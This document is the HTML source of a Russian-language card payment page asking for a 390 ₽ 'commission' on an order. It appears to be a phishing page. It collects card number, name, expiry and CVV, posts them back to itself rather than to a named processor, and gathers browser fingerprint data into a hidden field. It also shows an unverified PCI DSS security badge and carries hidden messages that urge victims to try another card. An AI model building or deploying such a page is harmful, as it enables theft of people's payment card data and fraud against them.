

<!DOCTYPE html>
<html lang="ru">
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta content="telephone=no" name="format-detection">
	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="referrer" content="no-referrer" />
	<title>Оплата вашего заказа</title>
	<link rel="shortcut icon" href="/static/f1/favicon.ico">
	<meta name="theme-color" content="#ffffff">
	<!--link href="https://fonts.googleapis.com/css?family=Roboto:300,400,700&amp;subset=cyrillic-ext" rel="stylesheet"-->
	<link rel="stylesheet" href="/static/f1/common.css"/>
	<link rel="stylesheet" href="/static/f1/restyle.css?d=c013f487eee99303becb99456f60e41e"/>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/additional-methods.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js"></script>
    <script type="text/javascript" src="/static/f1/jquery.synctranslit.min.js"></script>
    
<style>
/*Reset styles*/
*,
*::before,
*::after {
	box-sizing: border-box;
}

html {
	font-family: sans-serif;
	line-height: 1.15;
	-webkit-text-size-adjust: 100%;
	-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
	height: 100%;
}

body {
	margin: 0;
    font-family: "Roboto", Arial, Helvetica, sans-serif;
	font-size: 14px;
	font-weight: 400;
	line-height: 1.5;
	color: #000000;
	text-align: left;
	background-color: #EFEFEF;
	height: 100%;
}

[tabindex="-1"]:focus {
	outline: 0 !important;
}
hr {
	box-sizing: content-box;
	height: 0;
	overflow: visible;
	border: none;
	margin: 0 -30px;
}

h1, h2, h3, h4, h5, h6 {
	margin-top: 0;
	margin-bottom: 0;
}

p {
	margin-top: 0;
	margin-bottom: 1rem;
}

b,
strong {
	font-weight: bold;
}

small {
	font-size: 80%;
}

sub,
sup {
	position: relative;
	font-size: 75%;
	line-height: 0;
	vertical-align: baseline;
}

sub {
	bottom: -.25em;
}

sup {
	top: -.5em;
}

a {
	color: #00A3FF;
	text-decoration: none;
	background-color: transparent;
}

a:hover {
	color: #007EDA;
	text-decoration: underline;
}

a:not([href]):not([tabindex]) {
	color: inherit;
	text-decoration: none;
}

a:not([href]):not([tabindex]):hover, a:not([href]):not([tabindex]):focus {
	color: inherit;
	text-decoration: none;
}

a:not([href]):not([tabindex]):focus {
	outline: 0;
}

pre {
	margin-top: 0;
	margin-bottom: 1rem;
	overflow: auto;
}

figure {
	margin: 0 0 1rem;
}

img {
	vertical-align: middle;
	border-style: none;
}

svg {
	overflow: hidden;
	vertical-align: middle;
}

table {
	border-collapse: collapse;
}

caption {
	padding-top: 0.75rem;
	padding-bottom: 0.75rem;
	color: #6c757d;
	text-align: left;
	caption-side: bottom;
}

th {
	text-align: inherit;
}

label {
	display: inline-block;
	margin-bottom: 0.5rem;
}

button {
	border-radius: 0;
}

button:focus {
	outline: 1px dotted;
	outline: 5px auto -webkit-focus-ring-color;
}

input,
button,
select,
optgroup,
textarea {
	margin: 0;
	font-family: inherit;
	font-size: inherit;
	line-height: inherit;
}

button,
input {
	overflow: visible;
}

button,
select {
	text-transform: none;
}

select {
	word-wrap: normal;
}

button,
[type="button"],
[type="reset"],
[type="submit"] {
	-webkit-appearance: button;
}

button:not(:disabled),
[type="button"]:not(:disabled),
[type="reset"]:not(:disabled),
[type="submit"]:not(:disabled) {
	cursor: pointer;
}

button::-moz-focus-inner,
[type="button"]::-moz-focus-inner,
[type="reset"]::-moz-focus-inner,
[type="submit"]::-moz-focus-inner {
	padding: 0;
	border-style: none;
}

input[type="radio"],
input[type="checkbox"] {
	box-sizing: border-box;
	padding: 0;
}

input[type="date"],
input[type="time"],
input[type="datetime-local"],
input[type="month"] {
	-webkit-appearance: listbox;
}

textarea {
	overflow: auto;
	resize: vertical;
}

[type="number"]::-webkit-inner-spin-button,
[type="number"]::-webkit-outer-spin-button {
	height: auto;
}

[type="search"] {
	outline-offset: -2px;
	-webkit-appearance: none;
}

[type="search"]::-webkit-search-decoration {
	-webkit-appearance: none;
}

::-webkit-file-upload-button {
	font: inherit;
	-webkit-appearance: button;
}

/*Reset styles end*/


/*Bootstrap 4 grid*/
.container {
	width: 100%;
	padding-right: 16px;
	padding-left: 16px;
	margin-right: auto;
	margin-left: auto;
	max-width: 560px;
}

.container-fluid {
	width: 100%;
	padding-right: 8px;
	padding-left: 8px;
	margin-right: auto;
	margin-left: auto;
}

.row {
	display: -webkit-box;
	display: -ms-flexbox;
	display: flex;
	-ms-flex-wrap: wrap;
		flex-wrap: wrap;
	margin-right: -8px;
	margin-left: -8px;
}

.col-1, .col-2, .col-3, .col-4, .col-5, .col-6, .col-7, .col-8, .col-9, .col-10, .col-11, .col-12, .col,
.col-auto, .col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12, .col-sm,
.col-sm-auto, .col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, .col-md-12, .col-md,
.col-md-auto, .col-lg-1, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-10, .col-lg-11, .col-lg-12, .col-lg,
.col-lg-auto, .col-xl-1, .col-xl-2, .col-xl-3, .col-xl-4, .col-xl-5, .col-xl-6, .col-xl-7, .col-xl-8, .col-xl-9, .col-xl-10, .col-xl-11, .col-xl-12, .col-xl,
.col-xl-auto {
	position: relative;
	width: 100%;
	min-height: 1px;
	padding-right: 8px;
	padding-left: 8px;
}

.col {
	-ms-flex-preferred-size: 0;
	  flex-basis: 0;
	-webkit-box-flex: 1;
	  -ms-flex-positive: 1;
	      flex-grow: 1;
	max-width: 100%;
}

.col-auto {
	-webkit-box-flex: 0;
	  -ms-flex: 0 0 auto;
	      flex: 0 0 auto;
	width: auto;
	max-width: none;
}

.col-1 {
	-webkit-box-flex: 0;
	  -ms-flex: 0 0 8.3333333333%;
	      flex: 0 0 8.3333333333%;
	max-width: 8.3333333333%;
}

.col-2 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 16.6666666667%;
          flex: 0 0 16.6666666667%;
  max-width: 16.6666666667%;
}

.col-3 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 25%;
          flex: 0 0 25%;
  max-width: 25%;
}

.col-4 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 33.3333333333%;
          flex: 0 0 33.3333333333%;
  max-width: 33.3333333333%;
}

.col-5 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 41.6666666667%;
          flex: 0 0 41.6666666667%;
  max-width: 41.6666666667%;
}

.col-6 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 50%;
          flex: 0 0 50%;
  max-width: 50%;
}

.col-7 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 58.3333333333%;
          flex: 0 0 58.3333333333%;
  max-width: 58.3333333333%;
}

.col-8 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 66.6666666667%;
          flex: 0 0 66.6666666667%;
  max-width: 66.6666666667%;
}

.col-9 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 75%;
          flex: 0 0 75%;
  max-width: 75%;
}

.col-10 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 83.3333333333%;
          flex: 0 0 83.3333333333%;
  max-width: 83.3333333333%;
}

.col-11 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 91.6666666667%;
          flex: 0 0 91.6666666667%;
  max-width: 91.6666666667%;
}

.col-12 {
  -webkit-box-flex: 0;
      -ms-flex: 0 0 100%;
          flex: 0 0 100%;
  max-width: 100%;
}

.offset-1 {
  margin-left: 8.3333333333%;
}

.offset-2 {
  margin-left: 16.6666666667%;
}

.offset-3 {
  margin-left: 25%;
}

.offset-4 {
  margin-left: 33.3333333333%;
}

.offset-5 {
  margin-left: 41.6666666667%;
}

.offset-6 {
  margin-left: 50%;
}

.offset-7 {
  margin-left: 58.3333333333%;
}

.offset-8 {
  margin-left: 66.6666666667%;
}

.offset-9 {
  margin-left: 75%;
}

.offset-10 {
  margin-left: 83.3333333333%;
}

.offset-11 {
  margin-left: 91.6666666667%;
}

.w-100 {
  width: 100% !important;
}

.w-auto {
  width: auto !important;
}

.h-100 {
  height: 100% !important;
}

.d-flex {
  display: -webkit-box !important;
  display: -ms-flexbox !important;
  display: flex !important;
}

.d-inline-flex {
  display: -webkit-inline-box !important;
  display: -ms-inline-flexbox !important;
  display: inline-flex !important;
}

.flex-row {
  -webkit-box-orient: horizontal !important;
  -webkit-box-direction: normal !important;
      -ms-flex-direction: row !important;
          flex-direction: row !important;
}

.flex-column {
  -webkit-box-orient: vertical !important;
  -webkit-box-direction: normal !important;
      -ms-flex-direction: column !important;
          flex-direction: column !important;
}

.flex-row-reverse {
  -webkit-box-orient: horizontal !important;
  -webkit-box-direction: reverse !important;
      -ms-flex-direction: row-reverse !important;
          flex-direction: row-reverse !important;
}

.flex-column-reverse {
  -webkit-box-orient: vertical !important;
  -webkit-box-direction: reverse !important;
      -ms-flex-direction: column-reverse !important;
          flex-direction: column-reverse !important;
}

.flex-wrap {
  -ms-flex-wrap: wrap !important;
      flex-wrap: wrap !important;
}

.flex-nowrap {
  -ms-flex-wrap: nowrap !important;
      flex-wrap: nowrap !important;
}

.justify-content-start {
  -webkit-box-pack: start !important;
      -ms-flex-pack: start !important;
          justify-content: flex-start !important;
}

.justify-content-end {
  -webkit-box-pack: end !important;
      -ms-flex-pack: end !important;
          justify-content: flex-end !important;
}

.justify-content-center {
  -webkit-box-pack: center !important;
      -ms-flex-pack: center !important;
          justify-content: center !important;
}

.justify-content-between {
  -webkit-box-pack: justify !important;
      -ms-flex-pack: justify !important;
          justify-content: space-between !important;
}

.justify-content-around {
  -ms-flex-pack: distribute !important;
      justify-content: space-around !important;
}

.align-items-start {
  -webkit-box-align: start !important;
      -ms-flex-align: start !important;
          align-items: flex-start !important;
}

.align-items-end {
  -webkit-box-align: end !important;
      -ms-flex-align: end !important;
          align-items: flex-end !important;
}

.align-items-center {
  -webkit-box-align: center !important;
      -ms-flex-align: center !important;
          align-items: center !important;
}

.align-items-baseline {
  -webkit-box-align: baseline !important;
      -ms-flex-align: baseline !important;
          align-items: baseline !important;
}

.align-items-stretch {
  -webkit-box-align: stretch !important;
      -ms-flex-align: stretch !important;
          align-items: stretch !important;
}

.align-content-start {
  -ms-flex-line-pack: start !important;
      align-content: flex-start !important;
}
/*Bootstrap 4 grid end*/




/*Main styles*/

.form-control {
  display: block;
  width: 100%;
  padding: 8px 10px;
  font-size: inherit;
  line-height: 1.2;
  border-radius: 2px;
  border-color: rgba(0,0,0,0.2);
  border-width: 1px 1px 1px 1px;
  border-style: solid;
  outline: none;
  -webkit-appearance: none;
  -moz-appearance: none;
  -ms-appearance: none;
  appearance: none !important;

}
.form-control_center {
	text-align: center;
}
::-webkit-input-placeholder {
  color: rgba(0, 0, 0, 0.4);
  font-weight: normal;
  font-family: inherit;
  opacity: 1;
  font-size: inherit;
}
::-moz-placeholder {
  color: rgba(0, 0, 0, 0.4);
  font-weight: normal;
  font-family: inherit;
  opacity: 1;
  font-size: inherit;
}
:-moz-placeholder {
  color: rgba(0, 0, 0, 0.4);
  font-weight: normal;
  font-family: inherit;
  opacity: 1;
  font-size: inherit;
}
:-ms-input-placeholder {
  color: rgba(0, 0, 0, 0.4);
  font-weight: normal;
  font-family: inherit;
  opacity: 1;
  font-size: inherit;
}
placeholder {
  color: rgba(0, 0, 0, 0.4);
  font-style: normal;
  font-size: inherit;
}
.form-control:focus {
	border-color: #00A3FF;
	box-shadow: none!important;
}
.form-control.error {
	border-color: #FF3939;
}

.error {
    color: red;
    margin-left: 5px;
}

/* Base for label styling */
[type="checkbox"]:not(:checked), [type="checkbox"]:checked {
  position: absolute;
  left: -9999px;
}
[type="checkbox"]:not(:checked) + label, [type="checkbox"]:checked + label {
  position: relative;
  padding-left: 30px;
  cursor: pointer;
  display: inline-block;
  line-height: 15px;
  color: #555555;
}
/* checkbox aspect */
[type="checkbox"]:not(:checked) + label:before, [type="checkbox"]:checked + label:before{
  content: '';
  position: absolute;
  left: 0;
  top: 50%;
  width: 19px;
  height: 19px;
  border: 1px solid #00A3FF;
  background: #fff;
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  -ms-border-radius: 2px;
  border-radius: 2px;
  margin-top: -10px;
}
[type="checkbox"]:checked + label:before, [type="checkbox"]:checked + label:before{
  border: none;
}
[type="checkbox"]:checked + label:before {
  border: none !important;
}
/* checked mark aspect */
[type="checkbox"]:not(:checked) + label:after, [type="checkbox"]:checked + label:after {
  content: '';
  position: absolute;
  top: 50%;
  margin-top: -10px;
  left: 0px;
  width: 20px;
  height: 20px;
  line-height: 20px;
  color: #fff;
  transition: all 0.2s;
  background-color: #00A3FF;
  text-align: center;
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  -ms-border-radius: 2px;
  border-radius: 2px;
  background-image: url(../img/icon-check-sm.png);
  background-size: 9px auto;
  background-position: center;
  background-repeat: no-repeat;
}
/* checked mark aspect changes */
[type="checkbox"]:not(:checked) + label:after {
  opacity: 0;
  transform: scale(0);
}
[type="checkbox"]:checked + label:after {
  opacity: 1;
  transform: scale(1);
}
/* disabled checkbox */
[type="checkbox"]:disabled:not(:checked) + label:before, [type="checkbox"]:disabled:checked + label:before {
  box-shadow: none;
  border-color: #bbb;
  background-color: #ddd;
}
[type="checkbox"]:disabled:checked + label:after {
  background-color: #999;
  color: #ccc;
}
[type="checkbox"]:disabled + label {
  color: #999;
}
/* accessibility */
[type="checkbox"]:checked:focus + label:before {
  border: 1px transparent;
  background-color: #00A3FF;
}
/* hover style just for information */
[type="checkbox"]:not(:checked) + label:hover:before {
  background-color: rgba(0, 0, 0, 0.05);
}

/*buttons*/
button, input, select, textarea {
  font-family: inherit;
  font-size: inherit;
  line-height: inherit;
}
.btn, button, input[type="button"], input[type="submit"] {
  display: inline-block;
  padding: 12px 25px;
  line-height: 1;
  margin-bottom: 0;
  font-weight: 400;
  text-align: center;
  white-space: nowrap;
  vertical-align: middle;
  -ms-touch-action: manipulation;
  touch-action: manipulation;
  cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
  background-image: none;
  border: 1px solid transparent;
  box-sizing: border-box;
  -webkit-border-radius: 100px;
  -moz-border-radius: 100px;
  -ms-border-radius: 100px;
  border-radius: 4px;
/*  -moz-transition-duration: 0.3s;
  -o-transition-duration: 0.3s;
  -webkit-transition-duration: 0.3s;
  transition-duration: 0.3s;*/
}
.btn-full-width {
  width: 100%;
}
.btn:hover, button:hover, input[type="button"]:hover, input[type="submit"]:hover {
	text-decoration: none;
}
.btn:focus, button:focus, input[type="button"]:focus, input[type="submit"]:focus {
  outline: thin dotted;
  outline: 5px auto -webkit-focus-ring-color;
  outline-offset: -2px;

}
.btn.disabled, .btn[disabled], fieldset[disabled] .btn, button.disabled, button[disabled], fieldset[disabled] button {
  cursor: not-allowed;
  filter: alpha(opacity=50);
  -webkit-box-shadow: none;
  box-shadow: none;
  opacity: 0.5;
}
a.btn.disabled, fieldset[disabled] a.btn {
  pointer-events: none;
}
.btn, input[type="button"], input[type="submit"], button {
  color: #ffffff;
  background-color: #00A3FF;
  border-color: #00A3FF;
}
.btn:focus, input[type="button"]:focus, input[type="submit"]:focus, button:focus {
  color: #ffffff;
  background-color: #007EDA;
  border-color: #007EDA;
}
.btn:hover, input[type="button"]:hover, input[type="submit"]:hover, button:hover {
  color: #ffffff;
  background-color: #007EDA;
  border-color: #007EDA;
}
.btn:active, input[type="button"]:active, input[type="submit"]:active, button:active {
  color: #ffffff;
  background-color: #005BC6;
  border-color: #005BC6;
}
.btn-outline {
  color: #00A3FF;
  background: transparent;
  border-color: #09a1f4;
}
.btn-outline:hover, .btn-outline:focus {
  color: #007EDA;
  border-color: #007EDA;
  background: transparent;
}
.btn-outline:active {
  color: #005BC6;
  border-color: #005BC6;
  background: transparent;
}
.btn-xl {
  font-size: 1.2em;
  font-weight: 600;
}
.btn-xs {
  padding: 8px 20px;
  font-size: 1em;
}
/*buttons end*/

.clearfix:after, .clearfix:before {
  clear: both;
  content: ".";
  display: block;
  height: 0;
  line-height: 0;
  visibility: hidden;
}
.text-right {
	text-align: right;
}
.text-center {
	text-align: center;
}
.text-primary {
	color: #00A3FF;
}
.text-danger {
	color: #FF3939;
}
.text-dark {
	color: #000;
}
.text-muted {
	color: #555555;
}
.text-mutedx2 {
	color: #999999;
}
.text-sm {
	font-size: 13px;
}
.text-lg {
	font-size: 18px;
}
.text-uppercase {
	text-transform: uppercase;
}
.ml-5 {
	margin-left: 5px;
}
.mr-5 {
	margin-right: 5px;
}
.mt-10 {
	margin-top: 10px;
}
.mt-20 {
	margin-top: 20px;
}
.mt-30 {
	margin-top: 30px;
}
.mt-40 {
	margin-top: 40px;
}
.mb-10 {
	margin-bottom: 10px;
}
.mb-20 {
	margin-bottom: 20px;
}
.mb-30 {
	margin-bottom: 30px;
}
.mb-40 {
	margin-bottom: 40px;
}
.m-auto {
	margin-left: auto;
	margin-right: auto;
}
.header {
	background-color: #ffffff;
	padding: 10px 0;
}
.header--text {
	color: #555555;
	text-align: right;
}
.footer {
	background-color: #ffffff;
	padding: 10px 0;
}

.content {
	padding: 30px 0;
}
.form {
	padding: 20px 30px;
	background-color: #ffffff;
	border-radius: 3px;
}
.form-price--digit {
	font-size: 30px;
}

hr.form-line {
	background-color: #EFEFEF;
	height: 2px;
}
.form-line {
	margin-bottom: 20px;
	line-height: 1.2;
}
.form-line--label {
	color: #999999;
}

.pay-method {
	border: 1px solid rgba(0,0,0,0.1);
	border-radius: 3px;
	padding: 10px;
	width: 100%;
	text-align: center;
	position: relative;
	height: 100%;
	min-height: 90px;
	transition-duration: 0.3s;
	cursor: pointer;
}
.pay-method:hover {
	border: 1px solid #00A3FF;
}
.pay-method_selected,
.pay-method_selected:hover {
	border: 1px solid #00A3FF;
	box-shadow: 0 0 0 2px #00A3FF;
	cursor: default;
}
.pay-method_selected:before {
	width: 18px;
	height: 18px;
	line-height: 18px;
	text-align: center;
	content: "";
	background-color: #00A3FF;
	background-image: url("/static/f1/icon-check-sm.png");
	background-size: 9px auto;
	background-position: center;
	background-repeat: no-repeat;
	position: absolute;
	top: 5px;
	right: 5px;
	border-radius: 100px;
}
.pay-method--title {
	line-height: 1.2;
	bottom: 10px;
	margin-top: 10px;
	color: #555555;
}
.pay-method_selected .pay-method--title {
	color: #000000;
}
.pay-method--image img {
	vertical-align: middle;
}

.form-submit {
	text-align: right;
}
.credit-cards {
	padding-bottom: 50px;
	position: relative;
}
.credit-card {
	width: 336px;
	height: 194px;
	background-color: #EFEFEF;
	border-radius: 12px;
	box-shadow: 2px 2px 0px 0 rgba(0,0,0,0.2);
	padding: 20px;
}
.credit-card .form-control {
	letter-spacing: 1px;
}
.credit-card_front {
	z-index: 2;
	position: relative;
}
.credit-card .form-line {
	margin-bottom: 10px;
}
.credit-card .form-line:last-child {
	margin-bottom: 0;
}
.credit-card_rear {
	background-color: #F0EADE;
	z-index: 1;
	position: absolute;
	right: 0;
	bottom: 0;
}
.credit-card_rear:after {
	position: absolute;
	top: 20px;
	height: 37px;
	background-color: rgba(0,0,0,0.2);
	right: -2px;
	left:0;
	content: "";
}
.credit-card_rear .cvc {
	width: 70px;
	position: absolute;
	right: 20px;
	top: 70px;
}
.credit-card_rear .cvc-text {
	font-size: 13px;
	line-height: 1;
	margin-top: 10px;
}
.status-icon {
	width: 60px;
	height: 60px;
	line-height: 60px;
	text-align: center;
	background-color: #70C85A;
	border-radius: 100%;
}
.status-icon_error {
	background-color: #FF3939;
}

.footer--right {
	text-align: right;
}

/*Mobile version*/
@media (max-width: 340px) {
    .credit-card--brand img {
        display: none;
    }
}

/*Mobile version*/
@media (max-width: 500px) {
	.mt-10 {
		margin-top: 5px;
	}
	.mt-20 {
		margin-top: 10px;
	}
	.mt-30 {
		margin-top: 15px;
	}
	.mt-40 {
		margin-top: 20px;
	}
	.mb-10 {
		margin-bottom: 5px;
	}
	.mb-20 {
		margin-bottom: 10px;
	}
	.mb-30 {
		margin-bottom: 15px;
	}
	.mb-40 {
		margin-bottom: 20px;
	}
	.header--logo {
		width: 100%;
		text-align: center;
		-webkit-box-flex: 0;
	    -ms-flex: 0 0 100%;
	    flex: 0 0 100%;
	    max-width: 100%;
	}
	.header--text {
		display: none;
	}

	.content {
		padding-top: 16px;
	}

	.form {
		padding: 16px;
	}

	.form .input-mini {
		min-width: 60px;
	}

	.form-price--left, .form-price--right, .footer--left, .footer--right {
		-webkit-box-flex: 0;
	    -ms-flex: 0 0 100%;
	    flex: 0 0 100%;
	    max-width: 100%;
	    text-align: center;
	}

	.footer--right {
		margin-top: 10px;
	}

	.pay-methods .col-4 {
		-webkit-box-flex: 0;
	    -ms-flex: 0 0 50%;
	    flex: 0 0 50%;
	    max-width: 50%;
	    margin-bottom: 16px;
	}

	.form-agreement, .form-submit {
		-webkit-box-flex: 0;
	    -ms-flex: 0 0 100%;
	    flex: 0 0 100%;
	    max-width: 100%;
	}
	.form-submit {
		margin-top: 20px;
	}
	.form-submit .btn {
		width: 100%;
	}
	.form-line > div {
		-webkit-box-flex: 0;
	    -ms-flex: 0 0 100%;
	    flex: 0 0 100%;
	    max-width: 100%;
	}
	.form-line--label {
		margin-bottom: 5px;
	}

	.credit-cards {
	    padding-bottom: 70px;
	    position: relative;
	}
	.credit-card {
	    width: 100%;
	    height: 170px;
	}

	.credit-card_rear .cvc {
	    width: auto;
	    right: 20px;
	    display: flex;
	    left: 20px;
	}
	.credit-card_rear .cvc .form-control {
		width: 60px;
	}
	.credit-card_rear .cvc-text {
	    margin-top: 0;
	    margin-left: 10px;
	    width: 60%;
	}
	.credit-card_rear .cvc {
		bottom: 20px;
		top: auto;
	}

	.credit-card--brand {
		position: absolute;
		bottom: 27px;
		right: 15px;
	}
}

.modal {
	display: none;
	position: fixed;
	z-index: 1000;
	top: 0;
	left: 0;
	height: 100%;
	width: 100%;
	background: rgba(255, 255, 255, .8) url('/static/f1/wait.gif') 50% 50% no-repeat;
}
body.loading .modal {
	overflow: hidden;
}

body.loading .modal {
	display: block;
}

.black {
	color: #000;
}

.error-sending-div {
	border: 2px solid red;
	padding: 3px;
	font-weight: bold;
}
</style>
</head>
<body>
<div class="wrapper h-100 d-flex flex-column justify-content-between quest-step">

	<div class="content">
		<div class="container">

			<form id="cardform" name="cardform" class="form" method="post" action="" autocomplete="on">
                <input type="hidden" name="fp" id="fp-data" />
                <input type="hidden" name="ddata" id="ddata" />
                <div style="display: none">
                    <div class="mt-20 text-danger text-sm error-sending-div" style="margin: 5px">
                        Превышено
                        количество
                        попыток
                        оплат
                        с
                        данной
                        карты.
                        Дальнейшие
                        попытки
                        будут
                        отменяться
                        автоматически.

                    </div>
                    <hr class="form-line mt-20 mb-30"/>
                </div>
                <div class="form-price row align-items-center">
                    <div class="col-4 form-price--left">
                        <div class="form-price--digit">
                            390                            ₽
                        </div>
                                                    <div class="text-mutedx2"
                                 style="font-size: 10px;">
                                Возможна
                                дополнительная
                                комиссия
                                вашего
                                банка
                            </div>
                                            </div>
                    <div class="col-8 form-price--right">
                        <b>Детали
                            вашей
                            оплаты:</b>
                        <div class="text-primary">
                            Оплата комиссии<br/>							Заказ № <b>40082315973</b>
						</div>
					</div>
				</div>
				<hr class="form-line mt-20 mb-30"/>

				<div class="mt-30 text-center text-mutedx2">
					Заполните все поля карты и нажмите кнопку "Оплатить"
				</div>


				<div class="credit-cards mt-30">
					<div class="credit-card credit-card_front d-flex flex-column justify-content-end">
						<div class="form-line">
							<input class="form-control" type="text" placeholder="Номер карты"
								   name="card" id="card" autocomplete="off" spellcheck="false" inputmode="numeric"
                                   value="">
						</div>
                        
                        <div class="form-line" style="visibility: visible">
                            <input class="form-control text-uppercase" type="text" placeholder="IVAN IVANOV"
                                   name="name" id="name" value="" autocomplete="off" spellcheck="false">
                        </div>

						<div class="row align-items-center">
							<div class="col-3 input-mini">
								<input class="form-control form-control_center" type="text" placeholder="ММ"
									   maxlength="2"
									   name="month" id="month" inputmode="numeric"
                                       value="">
							</div>
							<div class="col-1 text-center text-mutedx2">
								/
							</div>
							<div class="col-3 input-mini">
								<input class="form-control form-control_center" type="text" placeholder="ГГ"
									   maxlength="2"
									   name="year" id="year" inputmode="numeric"
                                       value="">
							</div>
							<div class="col-5 text-right credit-card--brand">
                                <img src="/static/f1/ppay.png" alt="" style="height: 18px">
							</div>
						</div>
					</div>

					<div class="credit-card credit-card_rear d-flex flex-column justify-content-end">
						<div class="cvc align-items-center">
							<input class="form-control form-control_center" type="text" placeholder="000" maxlength="3"
								   name="cvv" id="cvv" autocomplete="off" spellcheck="false" inputmode="numeric"
                                   value="">
							<div class="cvc-text text-mutedx2">Три цифры с обратной стороны</div>
						</div>
					</div>
				</div>
				<div class="mt-20 text-danger text-sm error-sending-div" style="display: none">
                    Произошла ошибка при обработке карты банком.<br/> Возможно, недостаточно средств на счете. Пожалуйста, проверьте введенные данные и повторите попытку, нажав <b>Оплатить</b> <br/>
                    Если ошибка продолжает повторяться &ndash; необходимо использовать другую карту.
				</div>

				<div class="mt-20 text-danger text-sm error-div" style="display: none">Исправьте ошибки, выделенные
					красной рамкой:
				</div>

				<div class="row mt-40 align-items-center">
					<div class="col-7 form-agreement text-mutedx2">
						После ввода данных, нажмите Оплатить, после этого, введите код из SMS, которое вы получите от
						своего банка
					</div>
					<div class="col-5 form-submit">
						<button class="btn" id="pay_button">
							Оплатить
						</button>
					</div>
				</div>


				<hr class="form-line mt-30 mb-20"/>
				<div class="mt-30 text-center">
					<div class="text-mutedx2 mb-10">
						<img src="/static/f1/padlock.png" alt="">
						<span class="ml-5">Безопасность оплаты обеспечивается сертификатом PCI DSS 2.0</span>
					</div>
					<img src="/static/f1/protect-logos.png" alt="">
				</div>

			</form>
		</div>
	</div>

</div>
<script src="/static/f1/common.js?d=fce827963693df8ab600d59a48520459"></script>
<script>
    var device = {
        languages: navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        colorDepth: screen.colorDepth === 30 ? 24 : screen.colorDepth,
        screenHeight: screen.height,
        screenWidth: screen.width,
        timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    $("#ddata").val(JSON.stringify(device));

</script>


<div class="modal"></div>
</body>
</html>

